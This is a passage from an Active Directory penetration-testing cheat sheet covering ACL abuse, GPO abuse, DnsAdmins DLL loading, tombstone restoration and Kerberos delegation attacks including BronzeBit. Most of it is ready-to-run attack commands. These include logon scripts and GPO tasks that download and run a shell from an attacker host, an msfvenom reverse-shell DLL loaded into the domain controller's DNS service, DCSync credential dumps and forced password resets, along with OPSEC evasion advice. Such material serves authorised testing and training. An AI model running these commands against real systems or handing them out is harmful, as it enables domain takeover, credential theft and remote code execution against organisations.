evil-winrm -i <TARGET> -S -c <TARGET_USER>.crt -k <TARGET_USER>.key
```

> **Tip:** Often paired with a User template enrollable by any authenticated principal — once any domain creds are held, this becomes a soft path to passwordless admin on hosts with cert-mapped WinRM.

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Phase 4: ACL-Based Attacks

**Goal:** Exploit misconfigured Access Control Lists found via BloodHound.

### 4.1 Attack Matrix

| ACL Right | Attack | Impact |
|---|---|---|
| **GenericAll** (over user) | Reset password, targeted Kerberoasting, Shadow Credentials | Full control |
| **GenericAll** (over group) | Add yourself as member | Inherit group privileges |
| **GenericAll** (over computer) | RBCD attack | Impersonate any user to that computer |
| **GenericWrite** | Targeted Kerberoasting, Shadow Credentials, Logon Script | Impersonate or cred theft |
| **WriteSPN** (Validated-Write-SPN) | Set fake SPN → Kerberoast → clear (no password reset, no Shadow Cred prereq) | Account takeover via SPN write only — see §4.2a |
| **WriteOwner** | Change object owner to yourself → give yourself GenericAll | Full control |
| **WriteDACL** | Modify ACL → grant yourself any right | Full control |
| **ForceChangePassword** | Change user's password without knowing current | Account takeover |
| **AddMember** | Add yourself to a group | Inherit group privileges |
| **ReadLAPSPassword** | Read LAPS local admin password | Local admin on target computer |
| **ReadGMSAPassword** | Read GMSA managed password | Service account compromise |
| **CreateChild** (over OU) | Create dMSA linked to privileged account | Full domain compromise |
| **DCSync** (Replicating Directory Changes) | Replicate NTDS.dit | All domain hashes |
| **Reanimate-Tombstones** / GenericWrite over deleted object | Restore tombstoned user → reuse pre-deletion password | Account resurrection — see §4.9 |

#### Living-off-the-land equivalent — read ACLs without SharpHound / PowerView

`Get-Acl` against the AD: provider exposes the same DACL data that BloodHound parses. No SharpHound binary to drop; no PowerView module to import.

```powershell
# Inspect ACEs on a single object (user / group / OU / domain root)
$dn = (Get-ADUser <USER>).DistinguishedName            # RSAT path
# RSAT-free path:
$dn = ([adsisearcher]"(samaccountname=<USER>)").FindOne().Properties.distinguishedname[0]

Get-Acl "AD:$dn" | Select-Object -ExpandProperty Access |
    Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty|Self' } |
    Select-Object IdentityReference, ActiveDirectoryRights, ObjectType, InheritanceType

# Scan every user object for risky ACEs (slow on large domains — page it)
([adsisearcher]"(objectCategory=user)").FindAll() | ForEach-Object {
    $d = $_.Properties.distinguishedname[0]
    Get-Acl "AD:$d" | Select -Expand Access |
        Where { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner' -and
                $_.IdentityReference -notmatch 'NT AUTHORITY|BUILTIN|Domain Admins|Enterprise Admins' } |
        ForEach { [pscustomobject]@{ Target=$d; Principal=$_.IdentityReference; Right=$_.ActiveDirectoryRights } }
}
```

> **LOTL note:** The `AD:` PSDrive is provided by the ActiveDirectory module (RSAT). Without RSAT, use `[System.DirectoryServices.DirectoryEntry]::new("LDAP://$dn").ObjectSecurity.Access` for the same DACL read — works on any Windows host with .NET.

### 4.2 GenericAll / GenericWrite — User Target
```bash
# Force password change — see 4.6 ForceChangePassword for full command set
# (net rpc password / bloodyAD set password / rpcclient setuserinfo2 / Set-DomainUserPassword)

# Shadow Credentials (add Key Credential Link)
# https://github.com/ly4k/Certipy
certipy-ad shadow auto -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -account '<TARGET_USER>' -dc-ip <DC_IP>

# Targeted Kerberoasting (set SPN → Kerberoast → clear SPN)
# Via targetedKerberoast.py (automated):
# https://github.com/ShutdownRepo/targetedKerberoast
python3 targetedKerberoast.py -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP>

# Or manually via PowerView:
Set-DomainObject -Identity <TARGET_USER> -Set @{serviceprincipalname='nonexistent/YOURPC'}
# Then Kerberoast: impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request -outputfile targeted.txt
# Cleanup: Set-DomainObject -Identity <TARGET_USER> -Clear serviceprincipalname
```

### 4.2a WriteSPN (Validated-Write-SPN) — Targeted Kerberoast Without GenericAll

`WriteSPN` (BloodHound edge `DS-Validated-Write-SPN`, GUID `f3a64788-5306-11d1-a9c5-0000f80367c1`) is the *minimal-scope* ACL right for setting `servicePrincipalName` on a target user. Distinct from GenericAll/GenericWrite — you cannot reset the password, add Shadow Credentials, or modify other attributes; only SPN write. Common in tiered AD designs where service-account managers can register SPNs but not own the accounts.

**Pre-condition:** target user must NOT already have an SPN (otherwise standard Kerberoast covers it without ACL abuse).

**Enumerate (BloodHound-CE):**
```cypher
// Find every user where YOU have WriteSPN and the target has no SPN
MATCH (s:User {name:'<USER>@<DOMAIN>'})-[r:WriteSPN]->(t:User)
WHERE t.hasspn = false
RETURN s.name, t.name
```

```powershell
# LOTL — read DACL and check for the GUID that maps to Validated-Write-SPN
$dn = ([adsisearcher]"(samaccountname=<TARGET_USER>)").FindOne().Properties.distinguishedname[0]
Get-Acl "AD:$dn" | Select-Object -ExpandProperty Access |
    Where-Object { $_.ObjectType -eq 'f3a64788-5306-11d1-a9c5-0000f80367c1' -or
                   $_.ActiveDirectoryRights -match 'WriteProperty' } |
    Select IdentityReference, ActiveDirectoryRights, ObjectType
```

**Exploit — automated (set / request / clear in one pass):**
```bash
# https://github.com/ShutdownRepo/targetedKerberoast — handles the cleanup automatically
# Requires creds for <USER> who has WriteSPN over the target
python3 targetedKerberoast.py -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP>
# With Kerberos auth (NTLM-disabled DCs):
python3 targetedKerberoast.py -d <DOMAIN> --dc-host <DC_FQDN> -u '<USER>@<DOMAIN>' -k

# Output: TGS hashes (krb5tgs $23$ for RC4) for every user where you have SPN-write rights
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Exploit — manual (when targetedKerberoast.py isn't available or fails):**
```bash
# 1. Set a fake SPN on the victim (any non-existent SPN works — KDC just needs the attribute populated)
impacket-addspn -u '<DOMAIN>\\<USER>' -p '<PASSWORD>' -t '<TARGET_USER>' -s 'fake/svc' '<DC_FQDN>'
# Or via bloodyAD:
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' add uac '<TARGET_USER>' -f
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' set object '<TARGET_USER>' servicePrincipalName -v 'fake/svc'

# 2. Kerberoast the now-SPN'd target
impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request-user '<TARGET_USER>' -outputfile tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

# 3. CLEANUP — remove the SPN (otherwise the victim is permanently SPN'd and trivially roastable by anyone)
impacket-addspn -u '<DOMAIN>\\<USER>' -p '<PASSWORD>' -t '<TARGET_USER>' -s 'fake/svc' '<DC_FQDN>' -r
# Or:
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' remove object '<TARGET_USER>' servicePrincipalName -v 'fake/svc'
```

```powershell
# PowerView path (if you have a Windows foothold)
Set-DomainObject -Identity <TARGET_USER> -Set @{serviceprincipalname='fake/svc'}
# Roast: Get-DomainSPNTicket -Identity <TARGET_USER> | Out-File -Encoding ascii tgs.hash
# Cleanup:
Set-DomainObject -Identity <TARGET_USER> -Clear serviceprincipalname
```

> **🟡 OPSEC:** SPN modification = `4738` (user account changed) on the DC. Setting → roasting → clearing within seconds is a high-fidelity IOC pattern. The cleanup step is non-optional — leaving a fake SPN behind is both detectable on next AD audit and gives every domain user a free Kerberoast against the victim.

> **Why not GenericAll?** GenericAll lets you reset the password (loud, locks the account out, breaks services) or add Shadow Credentials (requires PKINIT working, AD CS reachable). WriteSPN keeps the victim's password intact and the account functional — only the SPN attribute changes briefly. Pick WriteSPN when GenericAll is *also* available and you don't want to disrupt the account.

### 4.3 GenericAll — Group Target
```bash
# Add user to group
net rpc group addmem "<TARGET_GROUP>" <USER> -U <DOMAIN>/<USER>%<PASSWORD> -S <DC_IP>

# Via PowerView
Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<USER>'
```

### 4.4 WriteDACL
```bash
# Grant yourself DCSync rights
impacket-dacledit -action 'write' -rights 'DCSync' -principal '<USER>' -target-dn 'DC=<DOMAIN>,DC=<TLD>' '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

# Via bloodyAD
bloodyAD -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' --host <DC_IP> add dcsync '<USER>'

# Or via PowerView
Add-DomainObjectAcl -TargetIdentity "DC=<DOMAIN>,DC=<TLD>" -PrincipalIdentity <USER> -Rights DCSync
```

### 4.5 WriteOwner

WriteOwner is a 3-step chain — the impacket-owneredit call only does step 1. All steps run from Linux over LDAP/SAMR; no WinRM needed. `<TARGET_OBJECT>` = sAMAccountName (`sam`, not `sam@domain`; `WS01$` for computers).

```bash
# === Full impacket chain ===
# Step 1: take ownership of the target object (this is what impacket-owneredit does)
impacket-owneredit -action 'write' -new-owner '<USER>' -target '<TARGET_OBJECT>' '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

# Step 2: as the new owner, grant yourself FullControl/GenericAll via WriteDACL
impacket-dacledit -action 'write' -rights 'FullControl' -principal '<USER>' \
    -target '<TARGET_OBJECT>' '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

# Step 3a: if target is a USER → reset their password
net rpc password '<TARGET_USER>' '<NEW_PASSWORD>' -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
# Or (more reliable on hardened DCs that block SAMR):
bloodyAD --host <DC_IP> -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' set password '<TARGET_USER>' '<NEW_PASSWORD>'

# Step 3b: if target is a GROUP → add yourself
net rpc group addmem '<TARGET_GROUP>' '<USER>' -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>

# Step 3c: if target is a COMPUTER → write msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)
#   See §5.3 Resource-Based Constrained Delegation for the RBCD chain.

# === bloodyAD one-tool equivalent (modern, single CLI for the whole chain) ===
bloodyAD --host <DC_IP> -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' set owner '<TARGET_OBJECT>' '<USER>'
bloodyAD --host <DC_IP> -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' add genericAll '<TARGET_OBJECT>' '<USER>'
bloodyAD --host <DC_IP> -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' set password '<TARGET_USER>' '<NEW_PASSWORD>'

# === PowerView equivalent (Windows foothold) ===
Set-DomainObjectOwner -Identity '<TARGET_OBJECT>' -OwnerIdentity '<USER>'
Add-DomainObjectAcl -TargetIdentity '<TARGET_OBJECT>' -PrincipalIdentity '<USER>' -Rights All
$pw = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
Set-DomainUserPassword -Identity '<TARGET_USER>' -AccountPassword $pw
```

### 4.6 ForceChangePassword
```bash
# Change target user's password without knowing their current password
# Requires: ForceChangePassword ACL right over the target user

# From Linux
net rpc password <TARGET_USER> 'NewP@ssw0rd!' -U <DOMAIN>/<USER>%<PASSWORD> -S <DC_IP>

# Via bloodyAD
bloodyAD -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' --host <DC_IP> set password '<TARGET_USER>' 'NewP@ssw0rd!'

# Via rpcclient
rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <DC_IP> -c "setuserinfo2 <TARGET_USER> 23 'NewP@ssw0rd!'"

# From Windows (PowerView)
$newpass = ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $newpass
```

### 4.7 GPO Abuse
If you have `GenericAll`, `GenericWrite`, or `WriteDACL` over a Group Policy Object, you can modify it to execute code on all computers/users in linked OUs.

**Attack chain:** Find writable GPO → identify linked OUs → check what computers/users are in those OUs → inject malicious task/script → wait for GPO refresh or force it.

```bash
# 1. Enumerate GPO permissions (BloodHound or PowerView)
# BloodHound: look for GenericAll/GenericWrite/WriteDACL edges to GPO objects
# PowerView:
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite' }

# 2. Identify which OUs a GPO is linked to and what's in those OUs
Get-DomainGPO -Identity '<GPO_NAME>' | Select-Object displayname,gpcfilesyspath
Get-DomainOU -GPLink '<GPO_GUID>' | Select-Object name,distinguishedname
# Check computers/users in the OU:
Get-DomainComputer -SearchBase 'OU=<OU_NAME>,DC=<DOMAIN>,DC=<TLD>' | Select-Object dnshostname
```

```powershell
# 3. Abuse from Windows — SharpGPOAbuse
# https://github.com/FSecureLABS/SharpGPOAbuse

# Add immediate scheduled task (runs once on next GPO refresh — most reliable)
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author '<DOMAIN>\Administrator' --Command "cmd.exe" --Arguments "/c net localgroup administrators <USER> /add" --GPOName "<GPO_NAME>"

# Add local admin directly
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount '<USER>' --GPOName "<GPO_NAME>"

# Add startup script (runs at next boot)
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName "backdoor.bat" --ScriptContents "net localgroup administrators <USER> /add" --GPOName "<GPO_NAME>"

# Add user logon script (runs when any user in linked OU logs in)
.\SharpGPOAbuse.exe --AddUserScript --ScriptName "logon.bat" --ScriptContents "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')" --GPOName "<GPO_NAME>"
```

```bash
# 4. Abuse from Linux — pyGPOAbuse
# https://github.com/Hackndo/pyGPOAbuse
python3 pygpoabuse.py '<DOMAIN>/<USER>:<PASSWORD>' -gpo-id '<GPO_GUID>' \
  -command 'net localgroup administrators <BACKDOOR_USER> /add' \
  -taskname 'Update' -dc-ip <DC_IP> -f

# Reverse shell via GPO immediate task
python3 pygpoabuse.py '<DOMAIN>/<USER>:<PASSWORD>' -gpo-id '<GPO_GUID>' \
  -command 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\"http://<ATTACKER_IP>/shell.ps1\")"' \
  -taskname 'Update' -dc-ip <DC_IP> -f
```

```bash
# 5. Force GPO update on target (if you have shell access)
gpupdate /force
# If no shell access, GPO refreshes automatically every ~90 minutes (+ random 0-30 min offset)
# Or reboot the target to trigger immediate Computer Configuration refresh
```

### 4.8 DnsAdmins Group Abuse
Members of the `DnsAdmins` group can load an arbitrary DLL into the DNS service, which runs as `SYSTEM` on the Domain Controller. This is a direct path to DC compromise.

```bash
# 1. Check if your user is in the DnsAdmins group
net user <USER> /domain | findstr -i "dns"
# Or:
Get-ADGroupMember -Identity "DnsAdmins" | Select-Object name
# From Linux:
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(&(objectClass=group)(cn=DnsAdmins))" member
```

```bash
# 2. Generate malicious DLL payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o evil.dll

# 3. Host the DLL via SMB (DNS service will load it over UNC path)
impacket-smbserver share /path/to/dll -smb2support
```

```powershell
# 4. From Windows — configure DNS to load the DLL (requires DnsAdmins membership)
dnscmd.exe <DC_HOSTNAME> /config /serverlevelplugindll \\<ATTACKER_IP>\share\evil.dll

# 5. Restart DNS service to trigger DLL load (requires permissions — DnsAdmins usually can)
sc.exe \\<DC_HOSTNAME> stop dns
sc.exe \\<DC_HOSTNAME> start dns
# Or via PowerShell:
Restart-Service -Name DNS -ComputerName <DC_HOSTNAME> -Force
```

```bash
# 6. From Linux — configure DNS remotely via impacket (if you have DnsAdmins creds)
# Use dnscmd via WMI/SMB:
impacket-wmiexec '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>' 'dnscmd /config /serverlevelplugindll \\<ATTACKER_IP>\share\evil.dll'
impacket-wmiexec '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>' 'sc stop dns'
impacket-wmiexec '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>' 'sc start dns'

# 7. Catch the reverse shell (runs as SYSTEM on the DC)
rlwrap nc -nlvp <PORT>
```

> **Cleanup:** Remove the DLL config after exploitation: `dnscmd <DC_HOSTNAME> /config /serverlevelplugindll ""` and restart DNS.

### 4.9 AD Recycle Bin — Tombstoned Object Restoration

When the AD Recycle Bin feature is enabled (default on 2008 R2+ schemas), deleted user / group / computer objects are *tombstoned* — moved to `CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>` with most attributes preserved (including `userPassword` history, `memberOf`, `objectSid`). A principal with `Reanimate-Tombstones` extended right or `GenericWrite` over the deleted object can restore it. If the target was deleted *with a known/recoverable password* (often documented in IT password sheets, leaked spreadsheets, or `description` fields), restoration yields a working account.

**Pre-conditions:**
- AD Recycle Bin enabled (`Get-ADOptionalFeature -Filter 'Name -like "Recycle Bin Feature"'` → `EnabledScopes` non-empty)
- Your principal in `Domain Admins`, `Enterprise Admins`, the built-in `Administrators` group, or has `Reanimate-Tombstones` extended right / `GenericWrite` on the deleted object
- A known (or guessable) password from before the user was deleted

**Enumerate deleted objects:**
```powershell
# RSAT — list all tombstoned users (must use -IncludeDeletedObjects)
Get-ADObject -Filter 'isDeleted -eq $true -and ObjectClass -eq "user"' \
    -IncludeDeletedObjects \
    -Properties distinguishedName, samAccountName, lastKnownParent, whenChanged, memberOf
# Note: distinguishedName looks like:  CN=<NAME>\0ADEL:<GUID>,CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>
# The \0A is a literal null+LF separator — copy it verbatim into the restore command

# Filter for high-value tombstones (admins, service accounts, anything in privileged groups before deletion)
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects \
    -Properties memberOf | Where { $_.memberOf -match 'Admin|Operator|Backup|Replic' }
```

```bash
# From Linux — ldapsearch with the deleted-control OID 1.2.840.113556.1.4.417
# Most ldap clients drop this control; bloodyAD wraps it cleanly:
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' get search \
    --base 'CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>' \
    --filter '(isDeleted=TRUE)' \
    --attr distinguishedName,sAMAccountName,lastKnownParent

# Raw ldapsearch path (requires server-side control support):
ldapsearch -H ldap://<DC_FQDN> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' \
    -b 'CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>' \
    -E '!1.2.840.113556.1.4.417' \
    '(objectClass=user)' distinguishedName sAMAccountName
```

> **Bare DN doesn't enumerate by default** — the `Deleted Objects` container has explicit deny-by-default ACLs even for Domain Users. Need at least *List Contents* on the container, which Domain Admins / Enterprise Admins / specific delegated groups (often named `Restore Users`, `AD Recyclers`, etc.) hold by design.

**Restore the object:**
```powershell
# RSAT — single-shot restore (target lands back in lastKnownParent OU)
Restore-ADObject -Identity 'CN=<NAME>\0ADEL:<GUID>,CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>'

# Then test the old password (kept on the object through tombstone):
nxc smb <DC_FQDN> -u '<RESTORED_USER>' -p '<OLD_PASSWORD>' -k
impacket-getTGT <DOMAIN>/<RESTORED_USER>:'<OLD_PASSWORD>' -dc-ip <DC_IP>
```

```bash
# From Linux — bloodyAD has direct restore support
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' \
    set object 'CN=<NAME>\0ADEL:<GUID>,CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>' isDeleted -v ''
# Some bloodyAD versions need the explicit "remove" of the tombstone naming context:
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' \
    remove object 'CN=<NAME>\0ADEL:<GUID>,CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>' isDeleted
```

> **Token-type gotcha — restoring from Evil-WinRM fails.** Evil-WinRM gives a Network logon (type 3) token. RSAT cmdlets that touch `CN=Deleted Objects` (`Get-ADObject -IncludeDeletedObjects`, `Restore-ADObject`) often fail with `Directory object not found` or `Insufficient access rights` against a netonly token even when the underlying user has the right. Fix: spawn a `LOGON32_LOGON_NEW_CREDENTIALS` (type 9) shell with RunasCs:
>
> ```powershell
> # See windows-methodology.md §4.23 for full RunasCs reference
> .\RunasCs.exe <USER> <PASSWORD> "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Restore-ADObject 'CN=<NAME>\0ADEL:<GUID>,CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>'" -l 9
> ```

> **🟡 OPSEC:** `Restore-ADObject` writes EID `5136` (directory service object modified) on the DC with `Operation: Value Added` for every attribute restored — distinctive event chain. EID `5141` (object deleted) precedes the original tombstone; the restore is the inverse pattern and most XDR rules detect it.

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Phase 5: Delegation Attacks

**Goal:** Exploit Kerberos delegation to impersonate privileged users.

### 5.1 Unconstrained Delegation

Computers with unconstrained delegation cache TGTs of users who authenticate to them.

```bash
# Find unconstrained delegation computers (BloodHound or LDAP)
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName dNSHostName

# PowerView:
Get-DomainComputer -Unconstrained | select dnshostname

# If you compromise such a computer:

# Method 1: Coerce authentication (PetitPotam/PrinterBug) → capture DC's TGT
# On compromised host: run Rubeus monitor
# https://github.com/GhostPack/Rubeus
.\Rubeus.exe monitor /interval:5

# Coerce DC to authenticate to compromised host — try multiple methods, defenders patch them inconsistently
# MS-EFSRPC (PetitPotam) — usually unauth on unpatched DCs, authed on patched
# https://github.com/topotam/PetitPotam
python3 PetitPotam.py <COMPROMISED_HOST_IP> <DC_IP>
python3 PetitPotam.py -u <USER> -p <PASSWORD> -d <DOMAIN> <COMPROMISED_HOST_IP> <DC_IP>

# MS-RPRN (PrinterBug) — requires Print Spooler service running
# https://github.com/dirkjanm/krbrelayx (contains printerbug.py)
python3 printerbug.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> <COMPROMISED_HOST_IP>

# MS-DFSNM (DFSCoerce) — alternative when EFSRPC/RPRN patched
python3 dfscoerce.py -u <USER> -p <PASSWORD> -d <DOMAIN> <COMPROMISED_HOST_IP> <DC_IP>

# Coercer — all-in-one coercion tool, tries every method
# https://github.com/p0dalirius/Coercer
coercer coerce -u <USER> -p <PASSWORD> -d <DOMAIN> -l <COMPROMISED_HOST_IP> -t <DC_IP> -v

# Use captured TGT (from Rubeus monitor) — inject into current session
.\Rubeus.exe ptt /ticket:<BASE64_TGT>
# Or Mimikatz
.\mimikatz.exe "kerberos::ptt <TICKET.kirbi>" exit

# DCSync using the injected DC TGT (from Linux — convert kirbi → ccache first with impacket-ticketConverter)
impacket-ticketConverter DC01.kirbi DC01.ccache
export KRB5CCNAME=$PWD/DC01.ccache
impacket-secretsdump -k -no-pass '<DOMAIN>/DC01$@dc01.<DOMAIN>'
# From Windows (Mimikatz)
.\mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:Administrator" exit
```

> **Coercion patch awareness:** Microsoft has patched EFSRPC (CVE-2021-36942) requiring auth in most cases; PrinterBug still works if Spooler is enabled (commonly disabled on DCs post-PrintNightmare); DFSCoerce works on most unpatched systems. Always try Coercer first — it enumerates what's exploitable.

### 5.2 Constrained Delegation
```bash
# Find constrained delegation accounts
# LDAP filter:
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo

# PowerView:
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select dnshostname,msds-allowedtodelegateto

# If you have the password/hash of a constrained delegation account:
# Request a TGT, then S4U2Self + S4U2Proxy to get a service ticket as any user (e.g., Administrator)
impacket-getST -spn '<TARGET_SPN>' -impersonate Administrator '<DOMAIN>/<SERVICE_USER>:<PASSWORD>' -dc-ip <DC_IP>

# With hash
impacket-getST -spn '<TARGET_SPN>' -impersonate Administrator '<DOMAIN>/<SERVICE_USER>' -hashes :<NT_HASH> -dc-ip <DC_IP>

# Use the ticket
export KRB5CCNAME=Administrator@<TARGET_SPN>.ccache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET_FQDN>

# Alternative SPN (modify the SPN in the ticket for service abuse)
# CIFS → HOST, HTTP → WSMAN, etc.
impacket-getST -spn 'cifs/<TARGET_FQDN>' -impersonate Administrator -altservice 'http/<TARGET_FQDN>' '<DOMAIN>/<SERVICE_USER>:<PASSWORD>' -dc-ip <DC_IP>
```

#### S4U2Self Abuse (TRUSTED_TO_AUTH_FOR_DELEGATION)
If the account has `TRUSTED_TO_AUTH_FOR_DELEGATION` set (protocol transition enabled), S4U2Self will return a **forwardable** ticket. This means:
- S4U2Self: get a forwardable TGS for **any** user to your own service (no target user interaction needed)
- S4U2Proxy: forward that TGS to access the target service specified in `msDS-AllowedToDelegateTo`

```bash
# Check if protocol transition is enabled
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" \
  "(&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" \
  sAMAccountName msDS-AllowedToDelegateTo userAccountControl
# Flag 16777216 = TRUSTED_TO_AUTH_FOR_DELEGATION

# S4U2Self + S4U2Proxy full chain (impacket handles both steps automatically)
impacket-getST -spn '<TARGET_SPN>' -impersonate Administrator '<DOMAIN>/<SERVICE_USER>:<PASSWORD>' -dc-ip <DC_IP>

# Alternative service name abuse — after S4U2Proxy, the service name in the ticket
# can be changed because the KDC doesn't validate it. This lets you target any service
# on the same host, not just the one in msDS-AllowedToDelegateTo.
# Example: msDS-AllowedToDelegateTo = HTTP/web01 → get ticket → change to CIFS/web01
impacket-getST -spn 'http/<TARGET_FQDN>' -impersonate Administrator -altservice 'cifs/<TARGET_FQDN>,host/<TARGET_FQDN>,ldap/<TARGET_FQDN>' '<DOMAIN>/<SERVICE_USER>:<PASSWORD>' -dc-ip <DC_IP>
# The -altservice flag accepts comma-separated SPNs to generate tickets for multiple services

# From Windows (Rubeus) — S4U2Self + S4U2Proxy
.\Rubeus.exe s4u /user:<SERVICE_USER> /rc4:<NT_HASH> /impersonateuser:Administrator /msdsspn:<TARGET_SPN> /altservice:cifs,host,ldap /ptt
```

> **Key insight:** If `msDS-AllowedToDelegateTo` contains any SPN on a target host, you can effectively access **any** service on that host by changing the service name in the ticket after S4U2Proxy. The KDC does not re-validate the service name.

#### 5.2.5 BronzeBit (CVE-2020-17049)

The KDC normally refuses to set the `forwardable` flag on a ticket returned from S4U2Self when the requesting service account does **not** have `TrustedForDelegation` (i.e., constrained delegation without protocol transition — `userAccountControl` lacks `TRUSTED_TO_AUTH_FOR_DELEGATION`). Without a forwardable TGS, S4U2Proxy refuses to forward → constrained-delegation chain dies for users marked "Account is sensitive and cannot be delegated" or for service accounts that lack protocol transition.

**BronzeBit (CVE-2020-17049)** abuses the way the KDC encrypts the inner ticket with the service's long-term key. By decrypting the inner ticket with the service account's NT hash / AES key, flipping the forwardable bit on the inner Ticket structure, then re-encrypting it, you produce an evidence ticket the KDC will accept in the subsequent S4U2Proxy — even when it would never have signed a forwardable one itself. Bypass works against **every** Windows DC that hasn't installed the Nov-2020 patch + the registry-gated full mitigation (`HKLM\SYSTEM\CurrentControlSet\Services\Kdc\PerformTicketSignature=0` was the rollback flag; full enforcement requires `PerformTicketSignature=1`).

```bash
# Requires: service-account creds (password OR NT/AES hash) for an account that has at least
# one entry in msDS-AllowedToDelegateTo. The account does NOT need TRUSTED_TO_AUTH_FOR_DELEGATION.
# Impacket exposes the technique via getST -force-forwardable.

impacket-getST -spn cifs/<TARGET_HOST>.<DOMAIN> \
    -impersonate <PRIVILEGED_USER> \
    -dc-ip <DC_IP> \
    -force-forwardable \
    <DOMAIN>/<SERVICE_USER>:'<PASSWORD>'

# With NT hash
impacket-getST -spn cifs/<TARGET_HOST>.<DOMAIN> -impersonate Administrator \
    -dc-ip <DC_IP> -force-forwardable \
    -hashes :<NT_HASH> <DOMAIN>/<SERVICE_USER>

# With AES256 (preferred — avoids RC4 downgrade IOCs)
impacket-getST -spn cifs/<TARGET_HOST>.<DOMAIN> -impersonate Administrator \
    -dc-ip <DC_IP> -force-forwardable \
    -aesKey <AES256_KEY> <DOMAIN>/<SERVICE_USER>

# Use the resulting ticket
export KRB5CCNAME=<PRIVILEGED_USER>@cifs_<TARGET_HOST>.ccache
impacket-psexec -k -no-pass <DOMAIN>/<PRIVILEGED_USER>@<TARGET_HOST>.<DOMAIN>
```

**Why this matters for CPTS / Purple Team:**
- Constrained delegation accounts that look "safe" (no protocol transition flag) become exploitable when the patch is missing — common on legacy 2016/2019 DCs without cumulative updates.
- `-force-forwardable` also bypasses the "Account is sensitive and cannot be delegated" flag on the impersonated user — a lab will often mark Administrator sensitive precisely to test whether you reach for BronzeBit.

**Detection:**
- KDC Event 4769 (TGS request) where `Ticket Encryption Type` doesn't match the service account's strongest key.
- Sigma `posh_pc_persistence` / `kerberos_manipulation` rule families flag the modify-then-resubmit pattern when audit-level detail logging is on.
